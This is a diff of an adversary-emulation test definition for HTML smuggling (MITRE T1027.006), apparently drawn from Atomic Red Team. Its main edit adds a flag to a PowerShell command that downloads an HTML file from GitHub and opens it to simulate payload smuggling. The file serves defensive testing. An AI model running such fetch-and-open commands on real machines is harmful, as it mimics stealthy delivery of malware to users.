@@ -6,15 +6,15 @@
   tactic: stealth
   technique:
     attack_id: T1027.006
-    name: HTML Smuggling
+    name: 'Obfuscated Files or Information: HTML Smuggling'
   platforms:
     windows:
       psh:
         command: 'if (Test-Path "PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html")
           { exit 0} else { exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1027.006\bin\"
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html"
-          -OutFile "PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html"; fi;
-          & "PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html"'
+          -OutFile "PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html" -UseBasicParsing;
+          fi; & "PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html"'
         cleanup: $user = [System.Environment]::UserName; Remove-Item -Path C:\Users\$user\Downloads\FeelTheBurn.iso
           -ErrorAction Ignore
         elevation_required: false
@@ -24,9 +24,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - stealth
   - t1027.006
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     dependencies:
@@ -41,9 +41,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html"
-        -OutFile "PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html"
+        -OutFile "PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html" -UseBasicParsing
 
         '
     technique_created: '2021-05-20T12:20:42.219Z'
     atomic_guid: 30cbeda4-08d9-42f1-8685-197fad677734
-    import_timestamp: '2026-10-20T07:08:26.904137Z'
+    import_timestamp: '2026-10-21T07:01:49.638453Z'
